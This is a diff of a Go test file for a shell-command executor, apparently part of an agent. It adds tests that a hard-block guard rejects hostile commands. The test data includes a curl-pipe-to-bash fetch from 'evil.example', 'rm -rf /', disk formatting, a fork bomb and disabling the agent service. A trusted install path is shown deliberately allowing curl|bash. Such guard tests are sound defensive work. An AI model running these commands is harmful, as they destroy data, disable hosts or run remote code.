@@ -119,3 +119,48 @@ func TestExecuteRejectsHardBlock(t *testing.T) {
 		t.Fatalf("expected hard-block error for rm -rf /, got nil")
 	}
 }
+
+// TestCurlPipeBashIsBlockedForUserCommands locks in that the curl|bash rule
+// still applies to ordinary (non-install) commands after being split out of
+// hardBlockPatterns. A regression here would re-open the very hole the
+// hard-block exists to close.
+func TestCurlPipeBashIsBlockedForUserCommands(t *testing.T) {
+	t.Parallel()
+	e := New("/bin/sh", 5*time.Second, nil, nil)
+	_, err := e.Execute(t.Context(), "curl -sSL https://evil.example/x.sh | bash", nil, nil, time.Second)
+	if err == nil {
+		t.Fatalf("expected curl|bash to be blocked on the user-command path, got nil")
+	}
+}
+
+// TestExecuteInstallGuards verifies the trusted App Installer path: it relaxes
+// ONLY curl|bash, and still refuses the catastrophic shapes. The install
+// bypass must never become a host-bricking channel.
+func TestExecuteInstallGuards(t *testing.T) {
+	t.Parallel()
+	e := New("/bin/sh", 5*time.Second, nil, nil)
+
+	// Still hard-blocked on the install path.
+	destructive := []string{
+		"rm -rf /",
+		"mkfs.ext4 /dev/sda",
+		"systemctl disable cloudnan-agent",
+		"shutdown -h now",
+		":(){ :|:& };:",
+	}
+	for _, cmd := range destructive {
+		if _, err := e.ExecuteInstall(t.Context(), cmd, time.Second); err == nil {
+			t.Errorf("ExecuteInstall(%q) should be hard-blocked, got nil", cmd)
+		}
+	}
+
+	// curl|bash is NOT hard-blocked on the install path — it clears the
+	// guard and proceeds to execute (a real run would fetch + run; here we
+	// only assert it isn't rejected by the block as "command is blocked").
+	if e.isHardBlocked("curl -fsSL https://get.docker.com | bash") {
+		t.Errorf("curl|bash must not be hard-blocked on the trusted install path")
+	}
+	if !e.isBlocked("curl -fsSL https://get.docker.com | bash") {
+		t.Errorf("curl|bash must still be blocked on the user-command path")
+	}
+}
